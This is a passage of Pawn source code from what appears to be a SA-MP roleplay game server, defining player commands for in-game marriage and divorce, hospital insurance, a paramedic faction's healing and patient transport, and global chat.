	    return SendClientMessage(playerid, COLOR_GREY, "You can't do this right now.");

	SendClientMessage(playerid, COLOR_WHITE, "* Deattached all toys.");
	for(new x;x<MAX_PLAYERTOYS;x++)
	{
		RemovePlayerAttachedObject(playerid, x);
    }
    return 1;
}

CMD:divorce(playerid, params[])
{
	if(PlayerInfo[playerid][pMarried] < 1)
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not Married!");
		return 1;
	}

	new string[128], giveplayerid;
	if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /divorce [playerid/partofname]");

	if(IsPlayerConnected(giveplayerid))
	{
		if(ProxDetectorS(8.0, playerid, giveplayerid))
		{
			new dstring[MAX_PLAYER_NAME];
			new wstring[MAX_PLAYER_NAME];
			new giveplayer[MAX_PLAYER_NAME];
			GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
			format(string, sizeof(string), "%s", giveplayer);
			strmid(wstring, string, 0, strlen(string), 24);
			format(string, sizeof(string), "%s", PlayerInfo[playerid][pMarriedTo]);
			strmid(dstring, string, 0, strlen(string), 24);
			if(strcmp(dstring ,wstring, true) == 0)
			{
				format(string, sizeof(string), "* You've sent Divorce Papers to %s.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "* %s just sent you their Divorce Papers (type /accept divorce) to accept.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
				DivorceOffer[giveplayerid] = playerid;
				return 1;
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "   That player is not Married to you!");
				return 1;
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "That player isn't near you.");
			return 1;
		}

	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
		return 1;
	}
}

CMD:adivorce(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] > 3)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /adivorce [playerid/partofname]");

		if(IsPlayerConnected(giveplayerid))
		{
			ClearMarriage(giveplayerid);
			format(string, sizeof(string), "* You've admin divorced %s.", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			format(string, sizeof(string), "* You have been admin divorced by an admin.", GetPlayerNameEx(playerid));
			SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
			return 1;

		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
		return 1;
	}
}

CMD:witness(playerid, params[])
{
	new string[128], giveplayerid;
	if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /witness [playerid/partofname]");

	if(IsPlayerConnected(giveplayerid))
	{
		if(ProxDetectorS(8.0, playerid, giveplayerid))
		{
			if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "You can't Propose to yourself!"); return 1; }
			format(string, sizeof(string), "* You requested %s to be your Marriage Witness.", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			format(string, sizeof(string), "* %s just requested you to be their Marriage Witness (type /accept witness) to accept.", GetPlayerNameEx(playerid));
			SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
			MarryWitnessOffer[giveplayerid] = playerid;
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "That player isn't near you.");
			return 1;
		}

	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
		return 1;
	}
	return 1;
}

CMD:propose(playerid, params[])
{
	new
		string[128],
		giveplayerid;

	if(sscanf(params, "u", giveplayerid))
		return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /propose [playerid/partofname]");

	if(IsPlayerConnected(giveplayerid)) {
		if(PlayerInfo[giveplayerid][pMarried] > 0)
			return SendClientMessage(playerid, COLOR_GREY, "   That player is already married!");

		if(GetPlayerCash(playerid) < 10000)
			return SendClientMessage(playerid, COLOR_GREY, "   The Marriage & Reception costs $10000!");

		if(PlayerInfo[playerid][pMarried] > 0)
			return SendClientMessage(playerid, COLOR_GREY, "   You're already Married!");

		if(MarryWitness[playerid] == giveplayerid)
			return SendClientMessage(playerid, COLOR_GREY, "   You can't marry the witness!");

		if(giveplayerid == playerid)
			return SendClientMessage(playerid, COLOR_GREY, "You can't Propose to yourself!");

		if(ProxDetectorS(8.0, playerid, giveplayerid)) {
			format(string, sizeof(string), "* You proposed to %s.", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			format(string, sizeof(string), "* %s just proposed to you (type /accept marriage) to accept.", GetPlayerNameEx(playerid));
			SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
			ProposeOffer[giveplayerid] = playerid;
		} else return SendClientMessage(playerid, COLOR_GREY, "That player isn't near you.");
	} else return SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
	return 1;
}

CMD:buyinsurance(playerid, params[])
{
    if(IsPlayerInRangeOfPoint(playerid,2.0,1169.7209472656,-1348.3218994141,2423.0461425781) && PlayerInfo[playerid][pVW] == 1) {
        if(GetPlayerCash(playerid) >= 400) {
            if(PlayerInfo[playerid][pInsurance] != 1) {
                GivePlayerCash(playerid, -400);
                PlayerInfo[playerid][pInsurance] = 1;
                SendClientMessage(playerid, COLOR_WHITE, "   Insurance purchased, you paid $150 + a one-time transfer fee of $250, you will now be healed at All Saints Hospital for $150.");
                return 1;
            }
            else {
                SendClientMessage(playerid, COLOR_GRAD4, "You already have insurance at All Saints Hospital!");
            }
        }
        else {
            SendClientMessage(playerid, COLOR_GRAD4, "You don't have enough money for this insurance!");
        }
    }
    else if(IsPlayerInRangeOfPoint(playerid,2.0,1169.7209472656,-1348.3218994141,2423.0461425781) && PlayerInfo[playerid][pVW] == 2) {
        if(GetPlayerCash(playerid) >= 400) {
            if(PlayerInfo[playerid][pInsurance] != 2) {
                GivePlayerCash(playerid, -400);
                PlayerInfo[playerid][pInsurance] = 2;
                SendClientMessage(playerid, COLOR_WHITE, "   Insurance purchased, you paid $150 + a one-time transfer fee of $250, you will now be healed at County General Hospital for $150.");
                return 1;
            }
            else {
                SendClientMessage(playerid, COLOR_GRAD4, "You already have insurance at County General Hospital!");
            }
        }
        else {
            SendClientMessage(playerid, COLOR_GRAD4, "You don't have enough money for this insurance!");
        }
    }
    return 1;
}

CMD:insurehelp(playerid, params[])
{
    SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
    SendClientMessage(playerid, COLOR_WHITE,"*** INSURANCE HELP *** - type a command for more infomation.");
    SendClientMessage(playerid, COLOR_GRAD3,"*** INSURANCE *** /buyinsurance");
    SendClientMessage(playerid, COLOR_LIGHTRED,"*** INSURANCE *** ALL SAINTS: $150 + Transfer (One Time) Fee of $250");
    SendClientMessage(playerid, COLOR_LIGHTRED,"*** INSURANCE *** COUNTY: $150 + Transfer (One Time) Fee of $250");
    return 1;
}

CMD:fmdc(playerid, params[])
{
    new MemberString[1024], giveplayer[MAX_PLAYER_NAME], duty[10], string[128];
    if(PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pFaction] == 3 && PlayerInfo[playerid][pRank] >= 4)
	{
        if(IsPlayerInAnyVehicle(playerid))
		{
			foreach(Player, i)
			{
			    giveplayer = GetPlayerNameEx(i);
				if(PlayerInfo[i][pFaction] == 3)
				{
				    switch(PlayerInfo[i][pDuty])
			    	{
      	 				case 0:
			        	{
			        	    duty = "Off Duty";
						}
						case 1:
						{
						    duty = "On Duty";
						}
			        }
					format(string, sizeof(string), "*(%s) - (Calls Accepted: %d) - (Patients Delivered: %d) - (%s)\n", giveplayer, PlayerInfo[i][pCallsAccepted], PlayerInfo[i][pPatientsDelivered], duty);
					strcat(MemberString, string, sizeof(MemberString));
				}
			}
			if(strlen(MemberString) == 0)
			{
			    strcat(MemberString, "No Members online at this time.", sizeof(MemberString));
			}
			ShowPlayerDialogEx(playerid, FMDC, DIALOG_STYLE_LIST, "FMDC - Logged in | LSFMD Members", MemberString, "Select", "Cancel");
        }
        else SendClientMessage(playerid, COLOR_GREY, "You're not in a vehicle.");
    }
    return 1;
}

CMD:healme(playerid, params[])
{
	if(IsPlayerInRangeOfPoint(playerid, 2.0, 1179.4012451172,-1331.5632324219,2423.0461425781))
	{
		if(GetPVarType(playerid, "STD"))
		{
			DeletePVar(playerid, "STD");
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You're no longer infected with a STD anymore because of the Hospital's help!");
			GivePlayerCash(playerid, -100);
			SendClientMessage(playerid, TEAM_CYAN_COLOR, "Doc: Your medical bill contained $100. Have a nice day!");
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "   You don't have a STD to heal!");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "   You're not at a Hospital!");
	}
	return 1;
}

CMD:triage(playerid, params[])
{
    if(PlayerInfo[playerid][pFaction]==3||PlayerInfo[playerid][pLeader]==3)//model
	{
 		if(PlayerInfo[playerid][pTriageTime] != 0)
   		{
     		SendClientMessage(playerid, COLOR_GREY, "You must wait for 2 minutes to use this command.");
       		return 1;
	    }

	    new string[128], giveplayerid;
	    if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /triage [playerid/partofname]");

   		if(IsPlayerConnected(giveplayerid))
   		{
    	    if(playerid == giveplayerid) return SendClientMessage(playerid, COLOR_GRAD2, "You can't use this command on yourself.");
    	    if(ProxDetectorS(5.0, playerid, giveplayerid))
			{
	    	    new Float: health;
	    	    GetPlayerHealth(giveplayerid, health);
	    	    if(health >= 85) SetPlayerHealth(giveplayerid, 100);
				else SetPlayerHealth(giveplayerid, health+15.0);
	    	    format(string, sizeof(string), "* %s has healed %s.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
	    	    ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				PlayerInfo[playerid][pTriageTime] = 120;
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "That player isn't near you.");
			}
 		}
	}
	return 1;
}

CMD:heal(playerid, params[])
{
	if(GetPVarInt(playerid, "EventToken") == 1 && EventInfo[EventToggleHeal] == 1)
		return SendClientMessage(playerid, COLOR_GRAD2, "You can't heal in the event!");

	new
		giveplayerid,
		price;

	if(sscanf(params, "ud", giveplayerid, price))
		return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /heal [playerid/partofname] [price]");

	if(price < 20 || price > 100)
		return SendClientMessage(playerid, COLOR_GREY, "Healing price can't below $20 or above $100.");

	if(giveplayerid == playerid)
		return SendClientMessage(playerid, COLOR_GRAD1, "You can't heal yourself.");

	if(IsPlayerConnected(giveplayerid)) {
	    if(GetDistanceBetweenPlayers(giveplayerid, playerid) > 10)
	        return SendClientMessage(playerid, COLOR_GREY, "You're too far away from the target to heal them.");

		if(PlayerInfo[giveplayerid][pCash] < price && price > 0)
		    return SendClientMessage(playerid, COLOR_GREY, "The heal price is too expensive for the player.");

		new
			iVehicle = GetPlayerVehicleID(playerid),
			iGiveVehicle = GetPlayerVehicleID(giveplayerid);

		if(IsInLSFMD(playerid)) {
			if(IsAnAmbulance(iVehicle) && iVehicle == iGiveVehicle) {
				new
					Float:tempheal;
				GetPlayerHealth(giveplayerid, tempheal);

				if(tempheal >= 100.0)
					return SendClientMessage(playerid, TEAM_GREEN_COLOR,"That person is fully healed.");

				new
					string[64];

				format(string, sizeof(string), "You healed %s for $%d.", GetPlayerNameEx(giveplayerid),price);
				SendClientMessage(playerid, COLOR_PINK, string);

				GivePlayerCash(playerid, price / 2);
				GivePlayerCash(giveplayerid, -price);
				SetPlayerHealth(giveplayerid, 100);
				PlayerPlaySound(playerid, 1150, 0.0, 0.0, 0.0);
				PlayerPlaySound(giveplayerid, 1150, 0.0, 0.0, 0.0);

				format(string, sizeof(string), "You have been healed to 100 health for $%d by %s.",price, GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, TEAM_GREEN_COLOR,string);

				if(GetPVarType(giveplayerid, "STD")) {
					DeletePVar(giveplayerid, "STD");
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, "* You're no longer infected with a STD because of the medic's help.");
				}
			} else SendClientMessage(playerid, COLOR_GRAD1, "Both you and the patient must be in an ambulance.");
		} else SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	} else SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	return 1;
}

CMD:lsfmd(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 3 || PlayerInfo[playerid][pLeader] == 3)
	{
		if(AdminDuty[playerid] == 1)
			return SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");

		if(IsPlayerInRangeOfPoint(playerid,3,1188.5157470703,-1350.9741210938, 2423.2648925781) || IsPlayerInRangeOfPoint(playerid,3,190.006759, 166.887557, 1997.859375))
		{
			ShowPlayerDialogEx(playerid, LSFMDMENU, DIALOG_STYLE_LIST, "LSFMD","Duty\nUniform\nEquipment\nCivilian", "Select", "Cancel");
		}
		else
		{
			SendClientMessage(playerid, COLOR_RED, "You're not in range of your LSFMD lockers.");
		}
	}
	return 1;
}

CMD:lsfmddiv(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 3 && PlayerInfo[playerid][pRank] >= 5) {
		new
			string[128],
			giveplayerid,
			division;

		if(sscanf(params, "ud", giveplayerid, division)) {
			SendClientMessage(playerid, COLOR_WHITE, "USAGE: /lsfmddiv [playerid/partofname] [division]");
			SendClientMessage(playerid, COLOR_GRAD2, "Available division names: 0 (None), 1 (T&R), 2 (LF), 3 (FD)");
			return 1;
		}

		if(IsPlayerConnected(giveplayerid)) {
			if(PlayerInfo[giveplayerid][pFaction] == 3) {
				if(division == 0) {
					PlayerInfo[giveplayerid][pDivision] = 0;
					format(string, sizeof(string), "You have been kicked from your division by %s.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "You have kicked %s out of their division.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				} else if(division == 1) {
					PlayerInfo[giveplayerid][pDivision] = 1;
					format(string, sizeof(string), "You're now in the Training & Recruitment division, invited by %s.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "You have invited %s to join the Training & Recruitment Division.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				} else if(division == 2) {
					PlayerInfo[giveplayerid][pDivision] = 2;
					format(string, sizeof(string), "You're now in the Life Flight division, invited by %s.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "You have invited %s to join the Life Flight division.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				} else if(division == 3) {
					PlayerInfo[giveplayerid][pDivision] = 3;
					format(string, sizeof(string), "You're now in the Fire Department division, invited by %s.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "You have invited %s to join the Fire Department Division.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				} else cmd_lsfmddiv(playerid, "");
			} else SendClientMessage(playerid, COLOR_GRAD1, "The player you have selected is not in your faction.");
		} else SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	} else SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command - only LSFMD R5+ can do this.");
	return 1;
}

CMD:getpt(playerid, params[])
{
	if(PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pFaction] == 3)
	{
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /getpt(patient) [playerid/partofname]");

		if(IsPlayerConnected(giveplayerid))
		{
		    if(giveplayerid == playerid)
		    {
		        SendClientMessage(playerid, COLOR_LIGHTBLUE, "You can't accept your own Emergency Dispatch call!");
				return 1;
		    }
			if(GetPVarInt(giveplayerid,"MedicCall") == 1)
			{
				if(PlayerInfo[giveplayerid][pJailed] > 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't use this command on jailed players.");
				format(string, sizeof(string), "EMS Driver %s has accepted the Emergency Dispatch call for (%d) %s.",GetPlayerNameEx(playerid),giveplayerid,GetPlayerNameEx(giveplayerid));
				SendRadioMessage(3, TEAM_MED_COLOR, string);
				format(string, sizeof(string), "* You have accepted EMS Call from %s, you will see the marker until you have reached it.",GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "* EMS Driver %s has accepted your EMS Call; please wait at your current position.",GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
				GameTextForPlayer(playerid, "~w~EMS Caller~n~~r~Go to the red marker.", 5000, 1);
				EMSCallTime[playerid] = 1;
				EMSAccepted[playerid] = giveplayerid;
				SetPVarInt(giveplayerid, "EMSAttempt", 1);
				SetPVarInt(giveplayerid, "EMSWaiting", playerid);
				PlayerInfo[playerid][pCallsAccepted]++;
			}
			else
			{
				SendClientMessage(playerid, COLOR_WHITE, "The player has not requested any EMS attention!");
			}
		}
	}
	return 1;
}

CMD:listpt(playerid, params[]) {
    if(PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pFaction] == 3) {
        new
            szPlayerZone[MAX_ZONE_NAME],
            szMessage[128],
            Float:health,
			iCount;

        SendClientMessage(playerid, TEAM_CYAN_COLOR, "Patients awaiting treatment:");

        foreach(Player, i) {
            if(GetPVarInt(i, "Injured") == 1) {
                GetPlayerHealth(i,health);
                GetPlayer3DZone(i, szPlayerZone, MAX_ZONE_NAME);
				foreach(Player, j) {
					if(EMSAccepted[j] == i) {
						format(szMessage, sizeof(szMessage), "%s (ID: %d) - (near %s) - %.1f health remaining - Accepted: %s", GetPlayerNameEx(i), i, szPlayerZone, health, GetPlayerNameEx(j));
						SendClientMessage(playerid, COLOR_WHITE, szMessage);
						iCount ++;
					}
				}
				if(iCount == 0) {
					format(szMessage, sizeof(szMessage), "%s (ID: %d) - (near %s) - %.1f health remaining", GetPlayerNameEx(i), i, szPlayerZone, health);
					SendClientMessage(playerid, COLOR_WHITE, szMessage);
				}
            }
        }
    }
	return 1;
}

CMD:movept(playerid, params[])
{
	if(PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pFaction] == 3)
	{
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /movepatient [playerid/partofname]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(GetPVarInt(giveplayerid,"Injured") == 1)
			{
				if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You can't use this command while in a vehicle.");
				if(PlayerInfo[giveplayerid][pJailed] > 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't use this command on jailed players.");
				if(GetPVarInt(giveplayerid, "OnStretcher") == 1)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "The player is already on a stretcher, you can't do this right now!");
					return 1;
				}

				new Float:mX, Float:mY, Float:mZ;
				GetPlayerPos(giveplayerid, mX, mY, mZ);
				if(!IsPlayerInRangeOfPoint(playerid, 5.0, mX, mY, mZ))
				{
					SendClientMessage(playerid, COLOR_GRAD2, "You have to be close to the patient to be able to move them!");
					return 1;
				}
				SendClientMessage(playerid, COLOR_GRAD2, "You have 30 seconds to move to another location or you can either press the '{AA3333}FIRE{BFC0C2}' button.");
				format(string, sizeof(string), "* You have been put on a stretcher by %s.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "* You have put %s on a stretcher, you may move them now.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "* %s puts %s on a stretcher, tightening the belts securely.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

				SetPVarInt(giveplayerid, "OnStretcher", 1);
				SetPVarInt(playerid, "TickEMSMove", SetTimerEx("MoveEMS", 30000, false, "d", playerid));
				SetPVarInt(playerid, "MovingStretcher", giveplayerid);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD2, "The player has to be injured in-order to move them!");
			}
		}
	}
	return 1;
}

CMD:loadpt(playerid, params[])
{
    if(PlayerInfo[playerid][pFaction] == 3 || PlayerInfo[playerid][pLeader] ==3)
	{
        if(IsPlayerInAnyVehicle(playerid))
		{
            SendClientMessage(playerid, COLOR_GREY, "You can't use this while you're in a car!");
            return 1;
        }

        new string[128], giveplayerid, seat;
        if(sscanf(params, "ud", giveplayerid, seat)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /loadpt [playerid/partofname] [seatid]");

        if(IsPlayerConnected(giveplayerid))
		{
            if(giveplayerid != INVALID_PLAYER_ID)
			{
                if(seat < 2 || seat > 3)
				{
                    SendClientMessage(playerid, COLOR_GRAD1, "The seat ID can't be above 3 or below 2.");
                    return 1;
                }
                if(GetPVarInt(giveplayerid, "Injured") != 1)
				{
                    SendClientMessage(playerid, COLOR_GREY, "   That patient not injured - you can't load them.");
                    return 1;
                }
                if(IsPlayerInAnyVehicle(giveplayerid))
				{
                    SendClientMessage(playerid, COLOR_GREY, "   That patient is inside a car - you can't load them.");
                    return 1;
                }
                if(ProxDetectorS(8.0, playerid, giveplayerid))
				{
                    if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "You can't load yourself!"); return 1; }
                    if(PlayerInfo[giveplayerid][pJailed] > 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't use this command on jailed players.");
                    new carid = gLastCar[playerid];

                    if(IsAnAmbulance(carid))
					{
                        new Float:pos[6];
                        GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
                        GetPlayerPos(giveplayerid, pos[3], pos[4], pos[5]);
                        GetVehiclePos(carid, pos[0], pos[1], pos[2]);
                        if(floatcmp(floatabs(floatsub(pos[0], pos[3])), 10.0) != -1 &&
                            floatcmp(floatabs(floatsub(pos[1], pos[4])), 10.0) != -1 &&
                            floatcmp(floatabs(floatsub(pos[2], pos[5])), 10.0) != -1) return false;
                        format(string, sizeof(string), "* You were loaded by paramedic %s.", GetPlayerNameEx(playerid));
                        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
                        format(string, sizeof(string), "* You loaded patient %s.", GetPlayerNameEx(giveplayerid));
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                        format(string, sizeof(string), "* %s loads %s in the ambulance.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
                        ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                        SetPVarInt(giveplayerid, "EMSAttempt", 3);
                        ClearAnimations(giveplayerid, 1);
                        PutPlayerInVehicle(giveplayerid,carid,seat);
                        TogglePlayerControllable(giveplayerid, false);
                    }
                    else
					{
                        SendClientMessage(playerid, COLOR_GRAD2, "Your last car needs to be an ambulance!");
                    }
                }
                else
				{
                    SendClientMessage(playerid, COLOR_GREY, "You're not close enough to the player or your car!");
                    return 1;
                }
            }
        }
        else
		{
            SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
            return 1;
        }
    }
    else
	{
        SendClientMessage(playerid, COLOR_GRAD2, "   You're not a LSFMD!");
    }
    return 1;
}

CMD:deliverpt(playerid, params[])
{
    if(PlayerInfo[playerid][pFaction]==3||PlayerInfo[playerid][pLeader]==3)
	{
        if(IsPlayerInAnyVehicle(playerid))
		{
			new string[128], giveplayerid;
		    if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /deliverpt [playerid/partofname]");

            new carid = GetPlayerVehicleID(playerid);
            new caridex = GetPlayerVehicleID(giveplayerid);
            if(IsAnAmbulance(carid))
			{
                if(carid == caridex)
				{
                    if(IsAtDeliverPatientPoint(playerid))
					{
                        if(playerid == giveplayerid)
						{
                            SendClientMessage(playerid, COLOR_GRAD2, "You can't deliver yourself to the hospital!");
                            return 1;
                        }
                        if(GetPVarInt(giveplayerid, "Injured") == 0)
						{
                            return SendClientMessage(playerid, COLOR_GRAD2, "That player is not injured!");
                        }
                        if(playerTabbed[giveplayerid] == 1)
						{
                            SendClientMessage(playerid, COLOR_GRAD2, "That player is paused, you can't currently deliver him!");
                            return 1;
                        }
                        SetPlayerHealth(giveplayerid, 100);
                        if(GetPVarType(giveplayerid, "STD"))
						{
							DeletePVar(giveplayerid, "STD");
                            SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, "* You're no longer infected with a STD anymore because of the hospital's help!");
                        }
                        GivePlayerCash(giveplayerid, -100);
                        GivePlayerCash(playerid,250);
                        KillEMSQueue(giveplayerid);
                        DeletePVar(giveplayerid, "MedicBill");
                        SendClientMessage(giveplayerid, TEAM_CYAN_COLOR, "Doc: Your medical bill comes in at $100. Have a nice day!");
                        format(string,sizeof(string),"You received $250 for successfully delivering the patient!");
                        SendClientMessage(playerid, TEAM_CYAN_COLOR, string);
                        SetPlayerPos(giveplayerid, 1169.7588,-1351.5490,2423.0461);
                        SetPlayerInterior(giveplayerid, 1);
                        PlayerInfo[giveplayerid][pInt] = 1;

		    			LoadObjectsForPlayer(giveplayerid);

                        PlayerInfo[playerid][pPatientsDelivered]++;
                        format(string, sizeof(string), "EMS Driver %s has successfully delivered Patient %s to the hospital.",GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
						SendRadioMessage(3, TEAM_MED_COLOR, string);

                        if(IsPlayerInRangeOfPoint(playerid, 5.0,1142.4733,-1326.3633,13.6259) || IsPlayerInRangeOfPoint(playerid, 5.0, 1165.1564,-1368.8240,26.6502))
						{
                            SetPlayerVirtualWorld(giveplayerid, 1);
                            PlayerInfo[giveplayerid][pVW] = 1;
                        }
                        else if(IsPlayerInRangeOfPoint(playerid, 5.0,2027.0599,-1410.6870,16.9922) || IsPlayerInRangeOfPoint(playerid, 5.0, 2024.5742,-1382.7844,48.3359))
					 	{
                            SetPlayerVirtualWorld(giveplayerid, 2);
                            PlayerInfo[giveplayerid][pVW] = 2;
                        }
                    }
                    else
					{
                        SendClientMessage(playerid, COLOR_GRAD2, "You're not near a deliver point - look out near the hospitals.");
                    }
                }
                else
				{
                    SendClientMessage(playerid, COLOR_GRAD2, "Patient must be in your car in order to deliver him.");
                }
            }
            else
			{
                SendClientMessage(playerid, COLOR_GRAD2, "You're not in an LSFMD vehicle.");
            }
        }
    }
    return 1;
}

CMD:toggc(playerid, params[])
{
	if(GlobalChat[playerid] == 0)
	{
        SendClientMessage(playerid, COLOR_WHITE, "You have enabled global chat, use /g to chat.");
        GlobalChat[playerid] = 1;
	}
	else if(GlobalChat[playerid] == 1)
	{
        SendClientMessage(playerid, COLOR_WHITE, "You have disabled global chat.");
        GlobalChat[playerid] = 0;
	}
	return 1;
}

CMD:g(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not logged in.");
		return 1;
	}
	if(PlayerInfo[playerid][pGCMuted] > 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "You're muted from this channel.");
		return 1;
	}
	new string[128];
	if(GlobalChatTimer[playerid] > 0)
	{
		format(string, sizeof(string), "You must wait %d seconds before speaking again in this channel.", GlobalChatTimer[playerid]);
		SendClientMessage(playerid, COLOR_GREY, string);
		return 1;
	}
	if(GlobalChat[playerid] == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "You're not in the global chat, type /toggc.");
		return 1;
	}

	if(isnull(params))
		return SendClientMessage(playerid, COLOR_WHITE, "USAGE: (/g) [text]");

	if(strlen(params) > 80)
	    return SendClientMessage(playerid, COLOR_GREY, "Your message is too long - the limit is 80 characters.");

	if(PlayerInfo[playerid][pAdmin] < 1 && PlayerInfo[playerid][pVip] == 1)
	{
		format(string, sizeof(string), "(( Bronze VIP %s: %s ))", GetPlayerNameEx(playerid), params);
		GlobalChatTimer[playerid] = 5;
	}
	else if(PlayerInfo[playerid][pAdmin] < 1 && PlayerInfo[playerid][pVip] == 2)
	{
		format(string, sizeof(string), "(( Silver VIP %s: %s ))", GetPlayerNameEx(playerid), params);
		GlobalChatTimer[playerid] = 5;
	}
	else if(PlayerInfo[playerid][pAdmin] < 1 && PlayerInfo[playerid][pVip] == 3)
	{
		format(string, sizeof(string), "(( Gold VIP %s: %s ))", GetPlayerNameEx(playerid), params);
		GlobalChatTimer[playerid] = 5;
	}
	else if(PlayerInfo[playerid][pHelper] == 1)
	{
		format(string, sizeof(string), "(( Junior Helper %s: %s ))", GetPlayerNameEx(playerid), params);
		GlobalChatTimer[playerid] = 2;
	}
